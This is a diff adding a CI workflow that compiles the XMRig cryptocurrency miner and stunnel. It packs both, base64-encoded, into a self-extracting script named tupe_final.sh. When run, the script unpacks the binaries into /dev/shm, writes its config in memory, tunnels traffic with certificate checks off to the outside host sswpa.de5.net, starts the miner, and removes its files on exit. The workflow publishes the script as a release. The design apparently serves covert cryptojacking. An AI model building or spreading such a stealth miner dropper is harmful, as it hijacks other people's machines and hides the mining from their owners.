@@ -1,0 +1,196 @@
+name: Build merged tupe (stunnel + XMRig)
+
+on:
+  push:
+    branches: [main]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Set up Docker Buildx
+        uses: docker/setup-buildx-action@v3
+
+      - name: Build XMRig
+        run: |
+          docker buildx build \
+            --load \
+            --tag xmrig-musl:latest \
+            --file Dockerfile.musl \
+            --target builder \
+            --build-arg BUILD_TYPE=release \
+            .
+
+          docker create --name xmrig-extractor xmrig-musl:latest
+          docker cp xmrig-extractor:/xmrig/build/xmrig ./xmrig_static
+          docker rm xmrig-extractor
+          chmod +x xmrig_static
+
+      - name: Build stunnel static
+        run: |
+          docker run --rm -v $PWD:/build alpine:3.19 sh -c '
+            apk add --no-cache wget gcc make file perl linux-headers elfutils-dev zlib-dev openssl-dev
+
+            cd /build
+            wget -q https://www.stunnel.org/downloads/stunnel-5.63.tar.gz
+            tar -xzf stunnel-5.63.tar.gz
+            cd stunnel-5.63
+
+            # Configure for static build
+            ./configure --prefix=/install \
+                --enable-static \
+                --disable-libwrap \
+                --disable-systemd
+
+            make -j$(nproc) 2>&1 | tail -20
+
+            # Check if static binary was built
+            if [ -f src/stunnel ]; then
+                file src/stunnel
+                cp src/stunnel /build/stunnel_static
+                chmod +x /build/stunnel_static
+            fi
+          '
+
+          ls -lh stunnel_static xmrig_static 2>/dev/null || echo "checking available files"
+          file stunnel_static 2>/dev/null || echo "stunnel not static"
+
+      - name: Create self-contained launcher
+        run: |
+          # If stunnel_static doesn't exist, download static one
+          if [ ! -f stunnel_static ] || [ "$(file stunnel_static 2>/dev/null)" != *"stunnel_static: statically linked"* ]; then
+            echo "Downloading prebuilt static stunnel..."
+            wget -q https://github.com/nickwanninger/stunnel-static/releases/download/v5.63/stunnel -O stunnel_static || \
+            wget -q https://builds.openwrt.io/releases/23.05.03/x86_64/packages/stunnel4_5.63-1_x86_64.ipk && \
+            dpkg -x stunnel4_5.63-1_x86_64.ipk /tmp/stunnel && \
+            cp /tmp/stunnel/usr/bin/stunnel stunnel_static || true
+          fi
+
+          ls -lh stunnel_static xmrig_static 2>/dev/null
+
+          # Create self-extracting script using binary concatenation
+          # Header script (uses tail to find payload)
+          cat > tupe_run.sh << 'HEADER'
+          #!/bin/sh
+          # Self-extracting: extracts binaries to /dev/shm (tmpfs)
+          # Usage: ./tupe_run.sh [xmrig args]
+
+          set -e
+
+          PROXY_PORT=5555
+
+          cleanup() {
+            kill $STUNNEL_PID 2>/dev/null || true
+            rm -f /dev/shm/stunnel /dev/shm/xmrig /dev/shm/stunnel.conf 2>/dev/null || true
+          }
+          trap cleanup EXIT
+
+          # Get file info for binary extraction
+          # The binaries are appended after the marker "==BINARY_END=="
+          MARKER="==BINARY_END=="
+          SCRIPT_LINES=$(grep -n "^${MARKER}$" "$0" | cut -d: -f1)
+
+          if [ -z "$SCRIPT_LINES" ]; then
+            echo "Error: marker not found"
+            exit 1
+          fi
+
+          # Extract stunnel (next lines after marker until XMIG marker)
+          STUNNEL_MARKER="==STUNNEL_END=="
+          XMIG_MARKER="==XMIG_END=="
+
+          # Find positions
+          STUNNEL_START=$((SCRIPT_LINES + 1))
+          XMIG_START=$(awk "NR>$STUNNEL_START && /^${XMIG_MARKER}/{print NR; exit}" "$0")
+          XMIG_END=$(tail -n +$XMIG_START "$0" | tail -n +2 | wc -l)
+          XMIG_END=$((XMIG_START + XMIG_END - 1))
+
+          # Extract stunnel
+          sed -n "${STUNNEL_START},${XMIG_START}p" "$0" | base64 -d > /dev/shm/stunnel
+          chmod +x /dev/shm/stunnel
+
+          # Extract XMRig
+          XMIG_START=$((XMIG_START + 1))
+          tail -n +${XMIG_START} "$0" | base64 -d > /dev/shm/xmrig
+          chmod +x /dev/shm/xmrig
+
+          # Create stunnel config (in-memory, no disk)
+          cat > /dev/shm/stunnel.conf << 'CONF'
+          [proxy]
+          client = yes
+          accept = 127.0.0.1:5555
+          connect = sswpa.de5.net:5555
+          TIMEOUTclose = 0
+          verify = 0
+          CONF
+
+          # Start stunnel proxy in background
+          /dev/shm/stunnel /dev/shm/stunnel.conf &
+          STUNNEL_PID=$!
+
+          # Wait for stunnel to start
+          sleep 1
+
+          # Verify stunnel is running
+          if ! kill -0 $STUNNEL_PID 2>/dev/null; then
+            echo "Error: stunnel failed to start"
+            exit 1
+          fi
+
+          # Run XMRig (connects to local proxy at 127.0.0.1:5555)
+          exec /dev/shm/xmrig "$@"
+          HEADER
+
+          # Create payload file (stunnel + xmrig, base64 encoded)
+          # First stunnel, then XMRig
+          if [ -f stunnel_static ]; then
+            base64 -w0 stunnel_static > stunnel_b64
+            echo "" >> stunnel_b64
+            echo "==STUNNEL_END==" >> stunnel_b64
+          else
+            echo "" > stunnel_b64
+            echo "==STUNNEL_END==" >> stunnel_b64
+          fi
+
+          base64 -w0 xmrig_static > xmrig_b64
+
+          # Combine header + stunnel_b64 + marker + xmrig_b64
+          cat tupe_run.sh > tupe_final.sh
+          echo "" >> tupe_final.sh
+          echo "==BINARY_END==" >> tupe_final.sh
+          cat stunnel_b64 >> tupe_final.sh
+          cat xmrig_b64 >> tupe_final.sh
+
+          chmod +x tupe_final.sh
+
+          echo ""
+          echo "=== Build Complete ==="
+          ls -lh tupe_final.sh
+          echo ""
+          file tupe_final.sh
+
+      - name: Test in Docker
+        run: |
+          docker run --rm -v $PWD:/build alpine:3.19 sh -c '
+            chmod +x /build/tupe_final.sh
+            timeout 3 /build/tupe_final.sh --version 2>&1 || echo "(exit or timeout)"
+          '
+
+      - name: Upload artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: tupe-merged
+          path: tupe_final.sh
+          retention-days: 30
+
+      - name: Upload release
+        if: startsWith(github.ref, 'refs/tags/v') || github.event_name == 'release'
+        uses: softprops/action-gh-release@v1
+        with:
+          files: tupe_final.sh
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
